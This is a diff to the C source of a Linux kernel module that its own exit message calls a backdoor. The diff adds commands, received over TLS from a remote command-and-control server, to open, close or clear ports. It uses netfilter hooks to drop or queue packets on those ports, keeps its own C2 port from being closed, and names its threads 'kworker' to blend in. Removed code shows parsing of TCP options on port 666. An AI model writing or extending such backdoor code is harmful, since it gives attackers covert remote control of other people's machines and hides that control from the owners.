@@ -40,7 +40,9 @@ struct sock* nl_sk;
 
 unsigned char* buffer;
 u16* open_ports;
-size_t port_count = 0;
+u16* closed_ports;
+size_t open_port_count = 0;
+size_t closed_port_count = 0;
 
 int send_msg(struct socket* sock, unsigned char* buf, size_t len);
 int recv_msg(struct socket* sock, unsigned char* buf, size_t len);
@@ -175,13 +177,17 @@ int read_TLS(void) {
     int i;
     const char* bad_len = "Invalid command length\n";
     const char* bad_port = "Invalid port number\n";
-    const char* cl = "Close not yet implemented\n";
-    const char* good = "Port is valid\n";
+    const char* open = "Port is now open\n";
+    const char* close = "Port is now closed\n";
     const char* unknown = "Unknown command\n";
+    const char* clear = "All port settings cleared\n";
+    const char* bad_drop = "Unable to close the C2 port\n";
+
     while (!kthread_should_stop()) {
+        tmp_port = 0;
         len = recv_msg(svc->tls_socket, buffer, MAX_PAYLOAD);
         printk(KERN_INFO "Received message from server %*.s\n", len, buffer);
-        if (len < 7) {
+        if (len < 5) {
             strcpy(buffer, bad_len);
             send_msg(svc->tls_socket, buffer, strlen(bad_len));
             continue;
@@ -189,19 +195,13 @@ int read_TLS(void) {
         if (memcmp("open ", buffer, 5) == 0) {
             //Open a port
             if (kstrtou16(buffer + 5, 10, &tmp_port)) {
-                printk(KERN_INFO "Bad port c:%c %d\n", buffer[5], tmp_port);
                 strcpy(buffer, bad_port);
                 send_msg(svc->tls_socket, buffer, strlen(bad_port));
                 continue;
             }
-            printk(KERN_INFO "Good port %u\n", tmp_port);
-            open_ports[port_count] = tmp_port;
-            ++port_count;
-            strcpy(buffer, good);
-            for (i = 0; i < strlen(good); ++i) {
-                printk(KERN_INFO "%c", buffer[i]);
-            }
-            send_msg(svc->tls_socket, buffer, strlen(good));
+            open_ports[open_port_count++] = tmp_port;
+            strcpy(buffer, open);
+            send_msg(svc->tls_socket, buffer, strlen(open));
         } else if (memcmp("close ", buffer, 6) == 0) {
             //Close a port
             if (kstrtou16(buffer + 6, 10, &tmp_port)) {
@@ -209,10 +209,19 @@ int read_TLS(void) {
                 send_msg(svc->tls_socket, buffer, strlen(bad_port));
                 continue;
             }
-            //open_ports[port_count] = tmp_port;
-            //++port_count;
-            strcpy(buffer, cl);
-            send_msg(svc->tls_socket, buffer, strlen(cl));
+            if (tmp_port == PORT) {
+                strcpy(buffer, bad_drop);
+                send_msg(svc->tls_socket, buffer, strlen(bad_drop));
+                continue;
+            }
+            closed_ports[closed_port_count++] = tmp_port;
+            strcpy(buffer, close);
+            send_msg(svc->tls_socket, buffer, strlen(close));
+        } else if (memcmp("clear", buffer, 5) == 0) {
+            open_port_count = 0;
+            closed_port_count = 0;
+            strcpy(buffer, clear);
+            send_msg(svc->tls_socket, buffer, strlen(clear));
         } else {
             strcpy(buffer, unknown);
             send_msg(svc->tls_socket, buffer, strlen(unknown));
@@ -286,46 +295,35 @@ int init_userspace_conn(void) {
 unsigned int incoming_hook(void* priv, struct sk_buff* skb, const struct nf_hook_state* state) {
     struct iphdr* ip_header = (struct iphdr*) skb_network_header(skb);
     struct tcphdr* tcp_header;
+    struct udphdr* udp_header;
     unsigned char* packet_data;
     unsigned char* timestamps = NULL;
     int i;
 
-    if (ip_header->protocol == 6) {
+    if (ip_header->protocol == IPPROTO_TCP) {
         tcp_header = (struct tcphdr*) skb_transport_header(skb);
-        packet_data = skb->data + (ip_header->ihl * 4) + (tcp_header->doff * 4);
 
-        if (ntohs(tcp_header->source) == 666) {
-            if (tcp_header->doff > 5) {
-                //Move to the start of the tcp options
-                timestamps = skb->data + (ip_header->ihl * 4) + 20;
-                for (i = 0; i < tcp_header->doff - 5; ++i) {
-                    if (*timestamps == 0x00) {
-                        //End of options
-                        timestamps = NULL;
-                        break;
-                    }
-                    if (*timestamps == 0x01) {
-                        //NOP
-                        ++timestamps;
-                    } else if (*timestamps == 8) {
-                        //Timestamp option
-                        if (timestamps[1] != 10) {
-                            printk(KERN_INFO "Timestamp option was malformed\n");
-                            continue;
-                        }
-                        //old_timestamp = ntohl(*((u32*) (timestamps + 2)));
-                    } else if (*timestamps == 3) {
-                        timestamps += 3;
-                    } else if (*timestamps == 4) {
-                        timestamps += 2;
-                    } else if (*timestamps == 5) {
-                        timestamps += timestamps[1];
-                    } else {
-                        timestamps += 4;
-                    }
-                }
+        for (i = 0; i < closed_port_count; ++i) {
+            if (ntohs(tcp_header->source) == closed_ports[i]) {
+                return NF_DROP;
             }
-            return NF_ACCEPT;
+        }
+        for (i = 0; i < open_port_count; ++i) {
+            if (ntohs(tcp_header->source) == open_ports[i]) {
+                return NF_QUEUE;
+            }
+        }
+    } else if (ip_header->protocol == IPPROTO_UDP) {
+        udp_header = (struct udphdr*) skb_transport_header(skb);
+        for (i = 0; i < closed_port_count; ++i) {
+            if (ntohs(udp_header->source) == closed_ports[i]) {
+                return NF_DROP;
+            }
+        }
+        for (i = 0; i < open_port_count; ++i) {
+            if (ntohs(udp_header->source) == open_ports[i]) {
+                return NF_QUEUE;
+            }
         }
     }
     return NF_ACCEPT;
@@ -360,40 +358,7 @@ unsigned int outgoing_hook(void* priv, struct sk_buff* skb, const struct nf_hook
 
     if (ip_header->protocol == 6) {
         tcp_header = (struct tcphdr*) skb_transport_header(skb);
-        packet_data = skb->data + (ip_header->ihl * 4) + (tcp_header->doff * 4);
-        if (ntohs(tcp_header->dest) == 666 && !tcp_header->syn && tcp_header->psh) {
-            if (tcp_header->doff > 5) {
-                //Move to the start of the tcp options
-                timestamps = skb->data + (ip_header->ihl * 4) + 20;
-                for (i = 0; i < tcp_header->doff - 5; ++i) {
-                    if (*timestamps == 0x00) {
-                        //End of options
-                        timestamps = NULL;
-                        break;
-                    }
-                    if (*timestamps == 0x01) {
-                        //NOP
-                        ++timestamps;
-                    } else if (*timestamps == 8) {
-                        //Timestamp option
-                        if (timestamps[1] != 10) {
-                            printk(KERN_INFO "Timestamp option was malformed\n");
-                            continue;
-                        }
-                        //Save old timestamp
-                        //old_timestamp = ntohl(*((u32*) (timestamps + 2)));
-                    } else if (*timestamps == 3) {
-                        timestamps += 3;
-                    } else if (*timestamps == 4) {
-                        timestamps += 2;
-                    } else if (*timestamps == 5) {
-                        timestamps += timestamps[1];
-                    } else {
-                        timestamps += 4;
-                    }
-                }
-            }
-            return NF_ACCEPT;
+        if (ntohs(tcp_header->dest) == 666) {
         }
     }
     return NF_ACCEPT;
@@ -440,6 +405,7 @@ static int __init mod_init(void) {
     }
     buffer = kmalloc(MAX_PAYLOAD, GFP_KERNEL);
     open_ports = kmalloc(2 * 65536, GFP_KERNEL);
+    closed_ports = kmalloc(2 * 65536, GFP_KERNEL);
 
     svc->read_thread = kthread_run((void*) read_TLS, NULL, "kworker");
     svc->write_thread = kthread_run((void*) write_TLS, NULL, "kworker");
@@ -478,6 +444,9 @@ static void __exit mod_exit(void) {
     }
     if (open_ports) {
         kfree(open_ports);
+    }
+    if (closed_ports) {
+        kfree(closed_ports);
     }
     printk(KERN_ALERT "removed backdoor module\n");
 }
